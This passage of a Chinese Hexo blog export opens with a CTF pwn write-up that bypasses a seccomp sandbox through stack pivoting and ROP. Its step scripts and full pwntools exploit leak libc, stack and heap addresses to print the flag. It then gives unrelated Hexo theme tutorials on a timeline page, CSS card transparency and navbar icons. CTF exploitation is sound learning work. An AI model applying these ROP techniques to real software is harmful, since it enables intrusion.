<li>漏洞函数会首先打开flag文件，将flag读入到堆上，并且关闭了flag文件描述符，然后使用seccomp开启沙箱保护，只允许read和write，exit（这里有点问题，好像不能直接用syscall的gadget，会直接报错<code>bad system call</code>，知道的师傅可以解释一下QWQ）。<br>然后漏洞函数读取0x40字节，可以溢出0x10字节。</li>
</ol>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul>
<li><p>首先可以通过构造fake stack来写入更大长度的rop链，分为两步，第一步覆盖rbp为想要写入的伪栈地址，然后重新返回到vuln_addr+8（如图，要跳过<code>push rbp，mov rbp，rsp</code>），第二步向伪栈写入内容，然后leave ret即可实现栈迁移。</p>
<img src="/posts/709ed7e9/image-20241028160356645.png" class="" title="image-20241028160356645">
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step1: construct fake rbp</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>, bss_addr, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;===welcome===\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: input ROP to leak libc</span></span><br><span class="line">payload = flat(pop_rdi, puts_got, puts_plt, vuln_addr)</span><br><span class="line">payload = flat(payload, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(payload)), bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后使用puts函数打印puts got表地址，泄漏libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step2: input ROP to leak libc</span></span><br><span class="line">payload = flat(pop_rdi, puts_got, puts_plt, vuln_addr)</span><br><span class="line">payload = flat(payload, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(payload)), bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&quot;puts_addr: <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="string">f&quot;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过libc上environ符号打印出其所在栈地址</p>
<img src="/posts/709ed7e9/image-20241028160954799.png" class="" title="image-20241028160954799">

<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step3: leak environ_addr</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_addr</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f497</span>+libc_addr</span><br><span class="line">read_addr = libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall = libc_addr+<span class="number">0x0000000000029db4</span></span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span>+libc_addr</span><br><span class="line"><span class="comment"># mp_addr = libc_addr+libc.sym[&quot;mp]+96+1</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">f&quot;read_addr: <span class="subst">&#123;<span class="built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)</span><br><span class="line">info(<span class="string">f&quot;write_addr: <span class="subst">&#123;<span class="built_in">hex</span>(write_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># info(f&quot;mp_addr: &quot;)</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x404600</span></span><br><span class="line">payload = flat(p64(bss_addr-<span class="number">0x100</span>)*<span class="number">6</span>, bss_addr, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, <span class="number">0</span>, pop_rsi, flag_addr, pop_rdx_r12, <span class="number">0x100</span>, bss_addr+<span class="number">0x30</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>, pop_rdi, <span class="number">0</span>, read_addr, vuln_addr+<span class="number">8</span>, <span class="number">0</span>, bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">environ_addr = <span class="number">0x28f2d0</span>+libc_addr</span><br><span class="line">payload = flat(pop_rdi, <span class="number">1</span>, pop_rsi, environ_addr, pop_rdx_r12, <span class="number">0x6</span>, <span class="number">0</span>, write_addr, vuln_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>, flag_addr-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&quot;stack_addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后根据偏移可以获取到栈上存储的堆地址，从而获取到存放flag的堆的地址</p>
<img src="/posts/709ed7e9/image-20241028161105890.png" class="" title="image-20241028161105890">
<p>脚本如下，这里假定堆地址只有3字节，可能需要多试几次才能出来：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step4: leak heap_addr</span></span><br><span class="line">heap_addr = stack_addr-<span class="number">0x130</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x30</span>, bss_addr+<span class="number">0x200</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, heap_addr, puts_plt, vuln_addr, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, bss_addr+<span class="number">0x200</span>-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))+<span class="number">0x30</span></span><br><span class="line">info(<span class="string">f&quot;heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>puts函数打印flag地址即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step5: print flag</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x30</span>, bss_addr+<span class="number">0x200</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, heap_addr, puts_addr, vuln_addr, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>, bss_addr+<span class="number">0x200</span>-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>完整exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x0000000000401828&quot;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *0x000000000040172D&quot;)</span></span><br><span class="line">p = gdb.debug(<span class="string">&quot;./pwn&quot;</span>, </span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            b *0x000000000040167E</span></span><br><span class="line"><span class="string">            b *0x000000000040172D</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;I_can_find_the_right_path\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack pivoting to leak libc</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x000000000040173b</span></span><br><span class="line">pop_rbp = <span class="number">0x000000000040129d</span></span><br><span class="line">vuln_addr = <span class="number">0x000000000040170A</span></span><br><span class="line">bss_addr = <span class="number">0x0000000000404500</span></span><br><span class="line">leave_ret = <span class="number">0x000000000040186C</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment"># step1: construct fake rbp</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>, bss_addr, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;===welcome===\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: input ROP to leak libc</span></span><br><span class="line">payload = flat(pop_rdi, puts_got, puts_plt, vuln_addr)</span><br><span class="line">payload = flat(payload, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="built_in">len</span>(payload)), bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&quot;puts_addr: <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">info(<span class="string">f&quot;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: leak environ_addr</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000002be51</span>+libc_addr</span><br><span class="line">pop_rdx_r12 = <span class="number">0x000000000011f497</span>+libc_addr</span><br><span class="line">read_addr = libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall = libc_addr+<span class="number">0x0000000000029db4</span></span><br><span class="line">pop_rax = <span class="number">0x0000000000045eb0</span>+libc_addr</span><br><span class="line"><span class="comment"># mp_addr = libc_addr+libc.sym[&quot;mp]+96+1</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">f&quot;read_addr: <span class="subst">&#123;<span class="built_in">hex</span>(read_addr)&#125;</span>&quot;</span>)</span><br><span class="line">info(<span class="string">f&quot;write_addr: <span class="subst">&#123;<span class="built_in">hex</span>(write_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># info(f&quot;mp_addr: &quot;)</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x404600</span></span><br><span class="line">payload = flat(p64(bss_addr-<span class="number">0x100</span>)*<span class="number">6</span>, bss_addr, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, <span class="number">0</span>, pop_rsi, flag_addr, pop_rdx_r12, <span class="number">0x100</span>, bss_addr+<span class="number">0x30</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>, pop_rdi, <span class="number">0</span>, read_addr, vuln_addr+<span class="number">8</span>, <span class="number">0</span>, bss_addr-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">environ_addr = <span class="number">0x28f2d0</span>+libc_addr</span><br><span class="line">payload = flat(pop_rdi, <span class="number">1</span>, pop_rsi, environ_addr, pop_rdx_r12, <span class="number">0x6</span>, <span class="number">0</span>, write_addr, vuln_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>, flag_addr-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&quot;stack_addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step4: leak heap_addr</span></span><br><span class="line">heap_addr = stack_addr-<span class="number">0x130</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x30</span>, bss_addr+<span class="number">0x200</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, heap_addr, puts_plt, vuln_addr, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>, bss_addr+<span class="number">0x200</span>-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))+<span class="number">0x30</span></span><br><span class="line">info(<span class="string">f&quot;heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step5: print flag</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x30</span>, bss_addr+<span class="number">0x200</span>, vuln_addr+<span class="number">8</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(pop_rdi, heap_addr, puts_addr, vuln_addr, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>, bss_addr+<span class="number">0x200</span>-<span class="number">0x30</span>-<span class="number">0x8</span>, leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo添加时间轴页面</title>
    <url>/posts/756843e3.html</url>
    <content><![CDATA[<p>添加一个时间轴页面，记录一下自己的建站历程</p>
<h2 id="添加时间线页面"><a href="#添加时间线页面" class="headerlink" title="添加时间线页面"></a>添加时间线页面</h2><ul>
<li><p>使用<code>hexo new page sitetime</code>新建一个归档页面，页面生成在<code>/source/sitetime/index.md</code>处。</p>
</li>
<li><p>主题中在menu处添加以下配置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span>   <span class="string">/</span>           <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">文章||fas</span> <span class="attr">fa-blog:</span></span><br><span class="line">    <span class="string">归档:</span>   <span class="string">/archives/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">    <span class="string">标签:</span>   <span class="string">/tags/</span>      <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="string">分类:</span>   <span class="string">/categories/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  </span><br><span class="line">  <span class="string">时间轴:</span> <span class="string">/sitetime</span>   <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-hourglass-end</span> <span class="string">//</span> <span class="string">这里添加时间轴</span></span><br><span class="line">  <span class="string">清单||fas</span> <span class="attr">fa-heartbeat:</span></span><br><span class="line">    <span class="string">音乐:</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="string">照片:</span> <span class="string">/Gallery/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-images</span></span><br><span class="line">    <span class="string">电影:</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line">    <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span>  <span class="string">far</span> <span class="string">fa-paper-plane</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>然后在<code>/source/sitetime/index.md</code>的配置代码（FrontMatter）中添加一行配置：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">layout:</span> <span class="string">sitetime</span></span><br></pre></td></tr></table></figure>

<p>注意layout后面的内容需要与后面创建的模版文件保持一致</p>
</li>
</ul>
<h2 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h2><p>参考<a href="https://butterfly.js.org/posts/ceeb73f/?highlight=timeline#Timeline">官方文档</a>：在<code>/source/sitetime/index.md</code>中添加以下内容即可在时间线中添加对应内容：</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: sitetime</span><br><span class="line"><span class="section">date: 2024-10-28 10:57:11</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line"></span><br><span class="line">&#123;% timeline 2024 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 10-22 --&gt;</span><br><span class="line">基于hexo重新建站，使用butterfly主题</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 10-27 --&gt;</span><br><span class="line">美化导航栏，添加导航栏图标，添加Gittalk评论区功能</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 10-28 --&gt;</span><br><span class="line">添加时间轴功能</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% timeline 2023 %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- timeline 04-09 --&gt;</span><br><span class="line"></span><br><span class="line">基于github.io仓库和byblog创建了我的博客网站</span><br><span class="line"></span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line"></span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><img src="/posts/756843e3/image-20241028112943535.png" class="" title="image-20241028112943535">

]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo美化卡片</title>
    <url>/posts/ced39921.html</url>
    <content><![CDATA[<p>对博客页面的卡片样式进行美化</p>
<h2 id="卡片设置半透明"><a href="#卡片设置半透明" class="headerlink" title="卡片设置半透明"></a>卡片设置半透明</h2><p><a href="https://blog.csdn.net/qq_44138925/article/details/128843200">参考链接</a></p>
<p>通过<strong>引入自定义css文件</strong>的方式实现。</p>
<ol>
<li><p>在代码根目录的&#x2F;source下新建&#x2F;config目录，&#x2F;config目录下分别新建css、js、img目录用于存储自定义的文件。</p>
</li>
<li><p>在&#x2F;source&#x2F;config&#x2F;css目录下新建transparancy.css文件，内容如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 文章页背景 */</span></span><br><span class="line"><span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#post</span> &#123;</span><br><span class="line">    <span class="comment">/* 以下代表透明度为0.7 可以自行修改*/</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,.<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 所有页面背景 */</span></span><br><span class="line"><span class="selector-id">#aside_content</span> <span class="selector-class">.card-widget</span>, <span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>, <span class="selector-class">.layout_page</span>&gt;<span class="selector-tag">div</span><span class="selector-pseudo">:first-child</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.recent-posts</span>), <span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#page</span>, <span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#post</span>, <span class="selector-class">.read-mode</span> <span class="selector-class">.layout_post</span>&gt;<span class="selector-id">#post</span>&#123;</span><br><span class="line">    <span class="comment">/* 以下代表透明度为0.7 */</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,.<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*侧边卡片的透明度 */</span></span><br><span class="line"><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">  <span class="attr">--card-bg</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, .<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 页脚透明 */</span></span><br><span class="line"><span class="comment">/* #footer &#123;	*/</span></span><br><span class="line">	<span class="comment">/* 以下代表透明度为0.7 */</span></span><br><span class="line"><span class="comment">/*	background: rgba(255,255,255, .0); </span></span><br><span class="line"><span class="comment">/* 暗色模式调整 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span><span class="selector-pseudo">:root</span> &#123;</span><br><span class="line">    <span class="attr">--card-bg</span>: <span class="built_in">rgba</span>(<span class="number">18</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>页脚透明注释掉了，有需要的可以自行取消注释~~~</p>
</li>
<li><p>引入css文件：在主题配置文件<code>_config.butterfly.yml</code>中引入css文件，使用inject实现。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Inject</span></span><br><span class="line"><span class="comment"># ps：引入自定义css、js</span></span><br><span class="line"><span class="comment">#     css文件在head引入，js文件在bottom里引入，有的js要求在head引入，不然无法生效</span></span><br><span class="line"><span class="comment"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class="line"><span class="comment"># ps: 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span> <span class="comment">#注入自定义css</span></span><br><span class="line">     <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/config/css/transparancy.css&quot;&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span> <span class="comment">#注入自定义js</span></span><br><span class="line">    <span class="comment">#  - &lt;script src=&quot;/config/js/script.js?v1&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">    <span class="comment"># - &lt;script src=&quot;/xxxx&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>实现效果：</p>
<img src="/posts/ced39921/image-20241028114530064.png" class="" title="image-20241028114530064">

<h2 id="个人信息卡设置"><a href="#个人信息卡设置" class="headerlink" title="个人信息卡设置"></a>个人信息卡设置</h2><h3 id="隐藏Follow-Me按钮"><a href="#隐藏Follow-Me按钮" class="headerlink" title="隐藏Follow Me按钮"></a>隐藏Follow Me按钮</h3><p>配置文件中修改<code>_config.butterfly.yml</code>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">card_author:</span></span><br><span class="line">    <span class="attr">button:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="社交媒体图标"><a href="#社交媒体图标" class="headerlink" title="社交媒体图标"></a>社交媒体图标</h3><p>配置文件中修改<code>_config.butterfly.yml</code>：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">social:</span></span><br><span class="line">  <span class="attr">fab fa-bilibili:</span> <span class="string">https://space.bilibili.com/630793337</span> <span class="string">||</span> <span class="string">Bilibili</span> <span class="string">||</span> <span class="string">&#x27;rgb(0,160,216)&#x27;</span></span><br><span class="line">  <span class="attr">fab fa-github:</span> <span class="string">https://github.com/Eknight-Eutopia</span> <span class="string">||</span> <span class="string">GitHub</span></span><br><span class="line">  <span class="attr">fas fa-envelope:</span> <span class="string">mailto:2715417602@qq.com</span> <span class="string">||</span> <span class="string">Email</span></span><br></pre></td></tr></table></figure>

<h3 id="修改图标悬停动画"><a href="#修改图标悬停动画" class="headerlink" title="修改图标悬停动画"></a>修改图标悬停动画</h3><p>头像和社交媒体图标的旋转动画很抽象，这里修改为放大动画：</p>
<p>使用上述自定义css文件方法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-info</span> <span class="selector-class">.card-info-social-icons</span> <span class="selector-class">.social-icon</span> <span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.avatar-img</span> <span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line">    <span class="attribute">transform</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终效果：</p>
<img src="/posts/ced39921/image-20241028115919781.png" class="" title="image-20241028115919781">



]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>建站</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客导航栏美化</title>
    <url>/posts/a5aaf96c.html</url>
    <content><![CDATA[<p>目前网站还是有一些问题，例如导航栏图标不全，还有样式比较丑…</p>
<h2 id="初始效果"><a href="#初始效果" class="headerlink" title="初始效果"></a>初始效果</h2><img src="/posts/a5aaf96c/image-20241027222855421.png" class="" title="image-20241027222855421">

<h2 id="改进方法"><a href="#改进方法" class="headerlink" title="改进方法"></a>改进方法</h2><h3 id="添加导航栏图标"><a href="#添加导航栏图标" class="headerlink" title="添加导航栏图标"></a>添加导航栏图标</h3><p>查找<a href="https://fontawesome.com.cn/"><code>fontawesome</code></a>图标库</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">nav:</span></span><br><span class="line">  <span class="comment"># Navigation bar logo image</span></span><br><span class="line">  <span class="attr">logo:</span></span><br><span class="line">  <span class="attr">display_title:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Whether to fix navigation bar</span></span><br><span class="line">  <span class="attr">fixed:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span>   <span class="string">/</span>           <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">文章||far</span> <span class="attr">fa-folder-open:</span></span><br><span class="line">    <span class="string">归档:</span>   <span class="string">/archives/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">    <span class="string">标签:</span>   <span class="string">/tags/</span>      <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">    <span class="string">分类:</span>   <span class="string">/categories/</span>  <span class="string">||</span>  <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  </span><br><span class="line">  <span class="string">时间轴:</span> <span class="string">/sitetime</span>   <span class="string">||</span>  <span class="string">fad</span> <span class="string">fa-hourglass-end</span></span><br><span class="line">  <span class="string">清单||fas</span> <span class="attr">fa-heartbeat:</span></span><br><span class="line">    <span class="string">音乐:</span> <span class="string">/music/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-music</span></span><br><span class="line">    <span class="string">照片:</span> <span class="string">/Gallery/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-images</span></span><br><span class="line">    <span class="string">电影:</span> <span class="string">/movies/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-video</span></span><br><span class="line">    <span class="string">关于:</span> <span class="string">/about/</span> <span class="string">||</span>  <span class="string">far</span> <span class="string">fa-paper-plane</span></span><br></pre></td></tr></table></figure>



